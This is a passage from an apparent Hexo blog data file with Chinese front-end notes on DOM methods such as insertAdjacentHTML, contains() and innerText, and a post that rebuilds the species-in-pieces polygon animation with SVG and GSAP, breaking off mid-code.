title=\"insertAdjacentHTML()方法\"></a>insertAdjacentHTML()方法</h4><p>两个参数:插入位置和要插入的 HTML 文本。第一个参数必须是下列值之一:</p>\n<ul>\n<li>“beforebegin”，在当前元素之前插入一个紧邻的同辈元素; </li>\n<li>“afterbegin”，在当前元素之下插入一个新的子元素或在第一个子元素之前再插入新的子元素;</li>\n<li>“beforeend”，在当前元素之下插入一个新的子元素或在最后一个子元素之后再插入新的子元素;</li>\n<li>“afterend”，在当前元素之后插入一个紧邻的同辈元素。</li>\n</ul>\n<p>第二个参数是一个HTML字符串：<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//作为前一个同辈元素插入</span></span><br><span class=\"line\">element.insertAdjacentHTML(<span class=\"string\">\"beforebegin\"</span>, <span class=\"string\">\"&lt;p&gt;Hello world!&lt;/p&gt;\"</span>);</span><br><span class=\"line\"><span class=\"comment\">//作为第一个子元素插入</span></span><br><span class=\"line\">element.insertAdjacentHTML(<span class=\"string\">\"afterbegin\"</span>, <span class=\"string\">\"&lt;p&gt;Hello world!&lt;/p&gt;\"</span>);</span><br><span class=\"line\"><span class=\"comment\">//作为最后一个子元素插入</span></span><br><span class=\"line\">element.insertAdjacentHTML(<span class=\"string\">\"beforeend\"</span>, <span class=\"string\">\"&lt;p&gt;Hello world!&lt;/p&gt;\"</span>);</span><br><span class=\"line\"><span class=\"comment\">//作为后一个同辈元素插入</span></span><br><span class=\"line\">element.insertAdjacentHTML(<span class=\"string\">\"afterend\"</span>, <span class=\"string\">\"&lt;p&gt;Hello world!&lt;/p&gt;\"</span>);</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"内存与性能问题\"><a href=\"#内存与性能问题\" class=\"headerlink\" title=\"内存与性能问题\"></a>内存与性能问题</h4><p>在使用 innerHTML、 outerHTML 属性和 insertAdjacentHTML()方法时，最好先手工删除要被替换的元素的所有事件处理 程序和 JavaScript 对象属性(第 13 章将进一步讨论事件处理程序)。</p>\n<p>另外，对于DOM操作，尽量减少次数，例如下面示例：<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i=<span class=\"number\">0</span>, len=values.length; i &lt; len; i++)&#123;</span><br><span class=\"line\">  ul.innerHTML += <span class=\"string\">\"&lt;li&gt;\"</span> + values[i] + <span class=\"string\">\"&lt;/li&gt;\"</span>; <span class=\"comment\">//要避免这种频繁操作!!</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// 应该如下处理</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> itemsHtml = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i=<span class=\"number\">0</span>, len=values.length; i &lt; len; i++)&#123;</span><br><span class=\"line\">  itemsHtml += <span class=\"string\">\"&lt;li&gt;\"</span> + values[i] + <span class=\"string\">\"&lt;/li&gt;\"</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">ul.innerHTML = itemsHtml;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"scrollIntoView-方法（了解）\"><a href=\"#scrollIntoView-方法（了解）\" class=\"headerlink\" title=\"scrollIntoView()方法（了解）\"></a>scrollIntoView()方法（了解）</h3><p>scrollIntoView()可以在所有 HTML 元素上调用，通过滚动浏览器窗口或某个容器元素，调用 元素就可以出现在视口中。如果给这个方法传入 true 作为参数，或者不传入任何参数，那么窗口滚动 之后会让调用元素的顶部与视口顶部尽可能平齐。如果传入 false 作为参数，调用元素会尽可能全部 出现在视口中，(可能的话，调用元素的底部会与视口顶部平齐。)不过顶部不一定平齐，例如:<br>//让元素可见 document.forms[0].scrollIntoView();<br>当页面发生变化时，一般会用这个方法来吸引用户的注意力。实际上，为某个元素设置焦点也会导 致浏览器滚动并显示出获得焦点的元素。<br>支持 scrollIntoView()方法的浏览器有 IE、Firefox、Safari 和 Opera。</p>\n<h2 id=\"专有扩展\"><a href=\"#专有扩展\" class=\"headerlink\" title=\"专有扩展\"></a>专有扩展</h2><h3 id=\"文档模式\"><a href=\"#文档模式\" class=\"headerlink\" title=\"文档模式\"></a>文档模式</h3><p>IE可以设置文档模式：<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!-- 语法 --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">http-equiv</span>=<span class=\"string\">\"X-UA-Compatible\"</span> <span class=\"attr\">content</span>=<span class=\"string\">\"IE=IEVersion\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"comment\">&lt;!-- 示例 --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">http-equiv</span>=<span class=\"string\">\"X-UA-Compatible\"</span> <span class=\"attr\">content</span>=<span class=\"string\">\"IE=Edge\"</span>&gt;</span></span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 获得文档模式</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> mode = <span class=\"built_in\">document</span>.documentMode;</span><br></pre></td></tr></table></figure>\n<h3 id=\"children属性\"><a href=\"#children属性\" class=\"headerlink\" title=\"children属性\"></a>children属性</h3><p>这个属性是 HTMLCollection 的实例，只包含元素中同样还是元素的子节点。除此之外， children 属性与 childNodes 没有什么区别</p>\n<h3 id=\"contains-方法\"><a href=\"#contains-方法\" class=\"headerlink\" title=\"contains()方法\"></a>contains()方法</h3><p>判断某个节点是不是另一个节点的后代。<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">alert(<span class=\"built_in\">document</span>.documentElement.contains(<span class=\"built_in\">document</span>.body)); <span class=\"comment\">//true</span></span><br></pre></td></tr></table></figure></p>\n<p>使用 DOM Level 3 compareDocumentPosition()也能够确定节点间的关系。</p>\n<p>通用的contains函数：<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">contains</span>(<span class=\"params\">refNode, otherNode</span>)</span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"keyword\">typeof</span> refNode.contains == <span class=\"string\">\"function\"</span> &amp;&amp;</span><br><span class=\"line\">          (!client.engine.webkit || client.engine.webkit &gt;= <span class=\"number\">522</span>))&#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> refNode.contains(otherNode);</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"keyword\">typeof</span> refNode.compareDocumentPosition == <span class=\"string\">\"function\"</span>)&#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> !!(refNode.compareDocumentPosition(otherNode) &amp; <span class=\"number\">16</span>);</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> node = otherNode.parentNode;</span><br><span class=\"line\">    <span class=\"keyword\">do</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (node === refNode)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            node = node.parentNode;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">while</span> (node !== <span class=\"literal\">null</span>);</span><br><span class=\"line\">          <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"插入文本\"><a href=\"#插入文本\" class=\"headerlink\" title=\"插入文本\"></a>插入文本</h3><h4 id=\"innerText-属性\"><a href=\"#innerText-属性\" class=\"headerlink\" title=\"innerText 属性\"></a>innerText 属性</h4><p>通过 innertText 属性可以操作元素中包含的所有文本内容，包括子文档树中的文本。</p>\n<p>可以通过 innerText 属性过滤掉 HTML 标签：<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">div.innerText = div.innerText;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 兼容函数</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getInnerText</span>(<span class=\"params\">element</span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (<span class=\"keyword\">typeof</span> element.textContent == <span class=\"string\">\"string\"</span>) ?</span><br><span class=\"line\">        element.textContent : element.innerText;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">setInnerText</span>(<span class=\"params\">element, text</span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">typeof</span> element.textContent == <span class=\"string\">\"string\"</span>)&#123;</span><br><span class=\"line\">        element.textContent = text;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        element.innerText = text;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"outerText-属性\"><a href=\"#outerText-属性\" class=\"headerlink\" title=\"outerText 属性\"></a>outerText 属性</h4><p>除了作用范围扩大到了包含调用它的节点之外，outerText 与 innerText 基本上没有多大区别。</p>\n<h3 id=\"滚动\"><a href=\"#滚动\" class=\"headerlink\" title=\"滚动\"></a>滚动</h3><ul>\n<li>scrollIntoViewIfNeeded(alignCenter):只在当前元素在视口中不可见的情况下，才滚 动浏览器窗口或容器元素，最终让它可见。如果当前元素在视口中可见，这个方法什么也不做。 如果将可选的 alignCenter 参数设置为 true，则表示尽量将元素显示在视口中部(垂直方向)。 10 Safari 和 Chrome 实现了这个方法。</li>\n<li>scrollByLines(lineCount):将元素的内容滚动指定的行高，lineCount 值可以是正值， 也可以是负值。Safari 和 Chrome 实现了这个方法。</li>\n<li>scrollByPages(pageCount):将元素的内容滚动指定的页面高度，具体高度由元素的高度决 定。Safari 和 Chrome 实现了这个方法。</li>\n</ul>\n<p>希望大家要注意的是，scrollIntoView()和scrollIntoViewIfNeeded()的作用对象是元素的 容器，而 scrollByLines()和 scrollByPages()影响的则是元素自身。<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//将页面主体滚动 </span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.body.scrollByLines(<span class=\"number\">5</span>);</span><br><span class=\"line\"><span class=\"comment\">//在当前元素不可见的时候，让它进入浏览器的视口</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.images[<span class=\"number\">0</span>].scrollIntoViewIfNeeded();</span><br><span class=\"line\"><span class=\"comment\">//将页面主体往回滚动</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.body.scrollByPages(<span class=\"number\">-1</span>);</span><br></pre></td></tr></table></figure></p>\n<p>由于 scrollIntoView()是唯一一个所有浏览器都支持的方法，因此还是这个方法最常用。</p>\n<h1 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h1>"},{"title":"species-in-pieces网站动效的JS实现","date":"2019-03-06T02:48:36.000Z","updated":"2019-03-06T02:48:36.000Z","_content":"# 前言\n看到[species](http://species-in-pieces.com/)网站做的很炫，想要借鉴，发现主要是用css3的`clip-path`实现的，兼容不好，因此想着用js实现下。下面作简单介绍，需要详细代码见[github库](https://github.com/jovysun/species-JS)。\n# 概述\n效果图如下：\n![效果图](1.gif)\n<!-- more -->\n# 详述\n\n## 基础知识\n1. SVG基本知识，重点viewBox，polygon；\n2. GSAP动画平台，重点TimelineMax，TweenMax；\n3. parcel构建工具的基本使用，[parcel](http://www.css88.com/doc/parcel/)。\n## 实现思路\n根据参考网站的代码，动物图案是用`clip-path: polygon()`实现的，第一时间想到了SVG的polygon;另外对于转场动画，过渡动画，找个自己熟悉的动画库实现就行了。需要特别说明的是：\n1. css的clip-path用的用的百分比数值，svg的polygon的points值不能用百分比数值，知道viewBox概念的应该清楚，其实points的值也不是一般认为的绝对像素值，因此写了个工具函数`parsePolygonStr`。\n2. 因为图案是分动物和场景（树枝，石头等）两部分，并且希望先绘制动物再绘制场景，因此HTML部分用g标签分成`extra`和`anis`。\n## 主要的代码如下：\n### 入口文件HTML\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\n    <title>species</title>\n</head>\n\n<body>\n    <div id=\"wrap\">\n        <svg class=\"stage\" viewBox=\"0 0 1000 700\" version=\"1.1\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n            <g id=\"extra\">\n                <polygon points=\"793.50,476.88,949.50,500.88,805.50,518.88\" fill=\"hsla(0, 0%, 100%, 0)\"></polygon>\n                <polygon points=\"793.50,476.88,949.50,500.88,805.50,518.88\" fill=\"hsla(0, 0%, 100%, 0)\"></polygon>\n                <polygon points=\"793.50,476.88,949.50,500.88,805.50,518.88\" fill=\"hsla(0, 0%, 100%, 0)\"></polygon>\n            </g>\n            <g id=\"anis\">\n                \n            </g>\n        </svg>\n        <button id=\"go_btn\">GO!</button>\n        <h1 class=\"name\"></h1>\n        <h2 class=\"desc\"></h2>\n    </div>\n    <script src=\"./index.js\"></script>\n</body>\n\n</html>\n```\n### 主要js脚本\n```js\n// 导入一个 SCSS module\nimport '../css/main.scss';\n\nimport { data, preData } from './data'\n\nimport { TweenMax, TweenLite, TimelineMax } from 'gsap'\n\n// NodeList转换Array\nfunction NodeList2Array(nodelist) {\n    let arr = [];\n    if (nodelist.length) {\n        arr = Array.prototype.slice.call(nodelist, 0);\n    }\n    return arr;\n}\n// 把'clip-path'值转成svg polygon可用的值\nfunction parsePolygonStr(polygonStr, width, height) {\n    let pointsArr = polygonStr.split(/\\s+|,\\s/);\n    let newPointArr = pointsArr.map(function(currentVal, index, arr) {\n        if (index % 2 === 0) {\n            return (parseFloat(currentVal) * width / 100).toFixed(2);\n        } else {\n            return (parseFloat(currentVal) * height / 100).toFixed(2);\n        }\n    });\n\n    return newPointArr;\n}\n\n\n\nlet body = document.querySelector('body'),\n    wrap = document.querySelector('#wrap'),\n    name = wrap.querySelector('.name'),\n    desc = wrap.querySelector('.desc'),\n    stage = wrap.querySelector('.stage'),\n    anis = document.querySelector('#anis'),\n    extra = document.querySelector('#extra'),\n    goBtn = document.querySelector('#go_btn'),\n    anisPolygons = null,\n    extraPolygons = null;\n\n\nlet currentSpeciesIndex = 0,\n    width = 1000,\n    height = 700;\n\n\nfunction init() {\n    let initSpecies = preData.preload;\n    name.innerHTML = initSpecies.name;\n    desc.innerHTML = initSpecies.desc;\n    body.style.background = initSpecies.background;\n\n    let polygonArr = initSpecies.polygon;\n\n    if (Object.prototype.toString.call(polygonArr) === '[object Array]') {\n        let polygonHtml = '';\n\n        polygonArr.forEach(function(element, index) {\n            let pointsVal = parsePolygonStr(element[0], width, height);\n            polygonHtml += '<polygon points=\"' + pointsVal + '\" fill=\"' + element[1] + '\"/>';\n        });\n        anis.innerHTML = polygonHtml;\n\n    }\n}\ninit();\nanisPolygons = anis.querySelectorAll('polygon');\nextraPolygons = extra.querySelectorAll('polygon');\n\nlet tl = new TimelineMax({ delay: 0.2 });\n// 初始的loading动画\nNodeList2Array(anisPolygons).forEach(function(target, index) {\n    let tm = TweenMax.fromTo(target, 0.9, { attr: { fill: 'rgba(0, 0, 0, .7)' } }, { attr: { fill: 'rgba(200, 20, 20, .45)' }, ease: Power0.easeNone, repeat: -1, yoyo: true });\n    tl.add(tm, 0.9 - 0.03 * index);\n})\n\n// 模拟加载完成\nsetTimeout(function() {\n    // 清除tl\n    tl.clear();\n    // loading完之后的一系列动画\n    // 1，变色，放大，爆炸碎片\n    tl.add(\n            [\n                TweenMax.to('#anis polygon', .6, {\n                    attr: {\n                        fill: function(index) {\n                            let fillVal = '#111';\n                            if (index % 5 === 0) {\n                                fillVal = '#28282a';\n                            } else if (index % 5 === 1) {\n                                fillVal = '#111';\n                            } else if (index % 5 === 2) {\n                                fillVal = '#333';\n                            } else if (index % 5 === 3) {\n                                fillVal = '#222';\n                            } else if (index % 5 === 4) {\n                                fillVal = '#121212';\n                            }\n                            return fillVal;\n                        }\n                    }\n                }),\n                TweenMax.to('#wrap .stage', .6, {\n                    scale: 1,\n                    ease: Back.easeOut.config(1.7)\n                }),\n                TweenMax.to('#anis polygon', .6, {\n\n                    attr: {\n                        points: function(index, target) {\n                            let nextSpeciesPolygon = preData.ready.polygon;\n                            // debugger\n                            return parsePolygonStr(nextSpeciesPolygon[index][0], width, height)\n                        },\n                        fill: function(index, target) {\n                            let nextSpeciesPolygon = preData.ready.polygon;\n                            return nextSpeciesPolygon[index][1];\n                        },\n                    }\n                    // ease: Power2.easeInOut,\n\n                })\n            ]\n        )\n        // 2，海豚\n        .add(\n            TweenLite.to('#anis polygon', .6, {\n\n                attr: {\n                    points: function(index, target) {\n                        let nextSpeciesPolygon = preData.preAni.polygon;\n                        return parsePolygonStr(nextSpeciesPolygon[index][0], width, height)\n                    },\n                    fill: function(index, target) {\n                        let nextSpeciesPolygon = preData.preAni.polygon;\n                        return nextSpeciesPolygon[index][1];\n                    },\n                },\n                // ease: Power2.easeInOut,\n            })\n        )\n        // 3，爆炸碎片\n        .add(\n            TweenMax.to('#anis polygon', .6, {\n\n                attr: {\n                    points: function(index, target) {\n                        let nextSpeciesPolygon = preData.ready.polygon;\n                        // debugger\n                        return parsePolygonStr(nextSpeciesPolygon[index][0], width, height)\n                    },\n                    fill: function(index, target) {\n                        let nextSpeciesPolygon = preData.ready.polygon;\n                        return nextSpeciesPolygon[index][1];\n                    },\n                }\n            }),\n            '+=0.4'\n        )\n        // 4，“piece”logo\n        .add(\n            TweenMax.to('#anis polygon', .6, {\n\n                attr: {\n                    points: function(index, target) {\n                        let nextSpeciesPolygon = preData.title.polygon;\n                        // debugger\n                        return parsePolygonStr(nextSpeciesPolygon[index][0], width, height)\n                    },\n                    fill: function(index, target) {\n                        let nextSpeciesPolygon = preData.title.polygon;\n                        return nextSpeciesPolygon[index][1];\n                    },\n                }\n            }),\n            '+=0.4'\n        );\n\n}, 3000);\n\n\n\n// 动物图案切换\nfunction playHandler() {\n    let nextSpecies = data[currentSpeciesIndex++];\n    if (!nextSpecies) {\n        return false;\n    }\n\n    name.innerHTML = nextSpecies.name;\n    desc.innerHTML = nextSpecies.desc;\n    body.style.background = nextSpecies.background;\n\n    let nextSpeciesPolygon = nextSpecies.polygon;\n\n    let subTl = new TimelineMax({ pause: true });\n\n    let arr1 = NodeList2Array(anisPolygons);\n    let arr2 = NodeList2Array(extraPolygons);\n\n    // 之所以没用TweenMax.staggerTo是因为属性对象中没法用获得index，如下实现不了\n    // attr: {\n    //     points: pointVal.join(' '),\n    //     fill: function(index){return nextSpeciesPolygon[index][1];}\n    // }\n\n    arr1.concat(arr2).forEach(function(target, index) {\n        let pointVal = parsePolygonStr(nextSpeciesPolygon[index][0], width, height),\n            fillVal = nextSpeciesPolygon[index][1];\n        subTl.add(\n            TweenMax.to(target, 0.5, {\n                attr: {\n                    points: pointVal.join(' '),\n                    fill: fillVal\n                },\n                ease: Back.easeOut.config(1.7)\n            }),\n            '-=0.47'\n        )\n    });\n\n    subTl.play();\n\n\n}\n\ngoBtn.addEventListener('click', playHandler, false);\n```\n# 后记\n[GSAP动画平台](https://greensock.com/gsap)真的很强大，推荐有交互动效方面需求的可以关注下。","source":"_posts/2019/03/2019-03-06-species-js.md","raw":"---\ntitle: species-in-pieces网站动效的JS实现\ntags:\n  - 动效\n  - svg\n  - JavaScript\ncategories:\n  - 前端\ndate: 2019-03-06 10:48:36\nupdated: 2019-03-06 10:48:36\n---\n# 前言\n看到[species](http://species-in-pieces.com/)网站做的很炫，想要借鉴，发现主要是用css3的`clip-path`实现的，兼容不好，因此想着用js实现下。下面作简单介绍，需要详细代码见[github库](https://github.com/jovysun/species-JS)。\n# 概述\n效果图如下：\n![效果图](1.gif)\n<!-- more -->\n# 详述\n\n## 基础知识\n1. SVG基本知识，重点viewBox，polygon；\n2. GSAP动画平台，重点TimelineMax，TweenMax；\n3. parcel构建工具的基本使用，[parcel](http://www.css88.com/doc/parcel/)。\n## 实现思路\n根据参考网站的代码，动物图案是用`clip-path: polygon()`实现的，第一时间想到了SVG的polygon;另外对于转场动画，过渡动画，找个自己熟悉的动画库实现就行了。需要特别说明的是：\n1. css的clip-path用的用的百分比数值，svg的polygon的points值不能用百分比数值，知道viewBox概念的应该清楚，其实points的值也不是一般认为的绝对像素值，因此写了个工具函数`parsePolygonStr`。\n2. 因为图案是分动物和场景（树枝，石头等）两部分，并且希望先绘制动物再绘制场景，因此HTML部分用g标签分成`extra`和`anis`。\n## 主要的代码如下：\n### 入口文件HTML\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\n    <title>species</title>\n</head>\n\n<body>\n    <div id=\"wrap\">\n        <svg class=\"stage\" viewBox=\"0 0 1000 700\" version=\"1.1\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n            <g id=\"extra\">\n                <polygon points=\"793.50,476.88,949.50,500.88,805.50,518.88\" fill=\"hsla(0, 0%, 100%, 0)\"></polygon>\n                <polygon points=\"793.50,476.88,949.50,500.88,805.50,518.88\" fill=\"hsla(0, 0%, 100%, 0)\"></polygon>\n                <polygon points=\"793.50,476.88,949.50,500.88,805.50,518.88\" fill=\"hsla(0, 0%, 100%, 0)\"></polygon>\n            </g>\n            <g id=\"anis\">\n                \n            </g>\n        </svg>\n        <button id=\"go_btn\">GO!</button>\n        <h1 class=\"name\"></h1>\n        <h2 class=\"desc\"></h2>\n    </div>\n    <script src=\"./index.js\"></script>\n</body>\n\n</html>\n```\n### 主要js脚本\n```js\n// 导入一个 SCSS module\nimport '../css/main.scss';\n\nimport { data, preData } from './data'\n\nimport { TweenMax, TweenLite, TimelineMax } from 'gsap'\n\n// NodeList转换Array\nfunction NodeList2Array(nodelist) {\n    let arr = [];\n    if (nodelist.length) {\n        arr = Array.prototype.slice.call(nodelist, 0);\n    }\n    return arr;\n}\n// 把'clip-path'值转成svg polygon可用的值\nfunction parsePolygonStr(polygonStr, width, height) {\n    let pointsArr = polygonStr.split(/\\s+|,\\s/);\n    let newPointArr = pointsArr.map(function(currentVal, index, arr) {\n        if (index % 2 === 0) {\n            return (parseFloat(currentVal) * width / 100).toFixed(2);\n        } else {\n            return (parseFloat(currentVal) * height / 100).toFixed(2);\n        }\n    });\n\n    return newPointArr;\n}\n\n\n\nlet body = document.querySelector('body'),\n    wrap = document.querySelector('#wrap'),\n    name = wrap.querySelector('.name'),\n    desc = wrap.querySelector('.desc'),\n    stage = wrap.querySelector('.stage'),\n    anis = document.querySelector('#anis'),\n    extra = document.querySelector('#extra'),\n    goBtn = document.querySelector('#go_btn'),\n    anisPolygons = null,\n    extraPolygons = null;\n\n\nlet currentSpeciesIndex = 0,\n    width = 1000,\n    height = 700;\n\n\nfunction init() {\n    let initSpecies = preData.preload;\n    name.innerHTML = initSpecies.name;\n    desc.innerHTML = initSpecies.desc;\n    body.style.background = initSpecies.background;\n\n    let polygonArr = initSpecies.polygon;\n\n    if (Object.prototype.toString.call(polygonArr) === '[object Array]') {\n        let polygonHtml = '';\n\n        polygonArr.forEach(function(element, index) {\n            let pointsVal = parsePolygonStr(element[0], width, height);\n            polygonHtml += '<polygon points=\"' + pointsVal + '\" fill=\"' + element[1] + '\"/>';\n        });\n        anis.innerHTML = polygonHtml;\n\n    }\n}\ninit();\nanisPolygons = anis.querySelectorAll('polygon');\nextraPolygons = extra.querySelectorAll('polygon');\n\nlet tl = new TimelineMax({ delay: 0.2 });\n// 初始的loading动画\nNodeList2Array(anisPolygons).forEach(function(target, index) {\n    let tm = TweenMax.fromTo(target, 0.9, { attr: { fill: 'rgba(0, 0, 0, .7)' } }, { attr: { fill: 'rgba(200, 20, 20, .45)' }, ease: Power0.easeNone, repeat: -1, yoyo: true });\n    tl.add(tm, 0.9 - 0.03 * index);\n})\n\n// 模拟加载完成\nsetTimeout(function() {\n    // 清除tl\n    tl.clear();\n    // loading完之后的一系列动画\n    // 1，变色，放大，爆炸碎片\n    tl.add(\n            [\n                TweenMax.to('#anis polygon', .6, {\n                    attr: {\n                        fill: function(index) {\n                            let fillVal = '#111';\n                            if (index % 5 === 0) {\n                                fillVal = '#28282a';\n                            } else if (index % 5 === 1) {\n                                fillVal = '#111';\n                            } else if (index % 5 === 2) {\n                                fillVal = '#333';\n                            } else if (index % 5 === 3) {\n                                fillVal = '#222';\n                            } else if (index % 5 === 4) {\n                                fillVal = '#121212';\n                            }\n                            return fillVal;\n                        }\n                    }\n                }),\n                TweenMax.to('#wrap .stage', .6, {\n                    scale: 1,\n                    ease: Back.easeOut.config(1.7)\n                }),\n                TweenMax.to('#anis polygon', .6, {\n\n                    attr: {\n                        points: function(index, target) {\n                            let nextSpeciesPolygon = preData.ready.polygon;\n                            // debugger\n                            return parsePolygonStr(nextSpeciesPolygon[index][0], width, height)\n                        },\n                        fill: function(index, target) {\n                            let nextSpeciesPolygon = preData.ready.polygon;\n                            return nextSpeciesPolygon[index][1];\n                        },\n                    }\n                    // ease: Power2.easeInOut,\n\n                })\n            ]\n        )\n        // 2，海豚\n        .add(\n            TweenLite.to('#anis polygon', .6, {\n\n                attr: {\n                    points: function(index, target) {\n                        let nextSpeciesPolygon = preData.preAni.polygon;\n                        return parsePolygonStr(nextSpeciesPolygon[index][0], width, height)\n                    },\n                    fill: function(index, target) {\n                        let nextSpeciesPolygon = preData.preAni.polygon;\n                        return nextSpeciesPolygon[index][1];\n                    },\n                },\n                // ease: Power2.easeInOut,\n            })\n        )\n        // 3，爆炸碎片\n        .add(\n            TweenMax.to('#anis polygon', .6, {\n\n                attr: {\n                    points: function(index, target) {\n                        let nextSpeciesPolygon = preData.ready.polygon;\n                        // debugger\n                        return parsePolygonStr(nextSpeciesPolygon[index][0], width, height)\n                    },\n                    fill: function(index, target) {\n                        let nextSpeciesPolygon = preData.ready.polygon;\n                        return nextSpeciesPolygon[index][1];\n                    },\n                }\n            }),\n            '+=0.4'\n        )\n        // 4，“piece”logo\n        .add(\n            TweenMax.to('#anis polygon', .6, {\n\n                attr: {\n                    points: function(index, target) {\n                        let nextSpeciesPolygon = preData.title.polygon;\n                        // debugger\n                        return parsePolygonStr(nextSpeciesPolygon[index][0], width, height)\n                    },\n                    fill: function(index, target) {\n                        let nextSpeciesPolygon = preData.title.polygon;\n                        return nextSpeciesPolygon[index][1];\n                    },\n                }\n            }),\n            '+=0.4'\n        );\n\n}, 3000);\n\n\n\n// 动物图案切换\nfunction playHandler() {\n    let nextSpecies = data[currentSpeciesIndex++];\n    if (!nextSpecies) {\n        return false;\n    }\n\n    name.innerHTML = nextSpecies.name;\n    desc.innerHTML = nextSpecies.desc;\n    body.style.background = nextSpecies.background;\n\n    let nextSpeciesPolygon = nextSpecies.polygon;\n\n    let subTl = new TimelineMax({ pause: true });\n\n    let arr1 = NodeList2Array(anisPolygons);\n    let arr2 = NodeList2Array(extraPolygons);\n\n    // 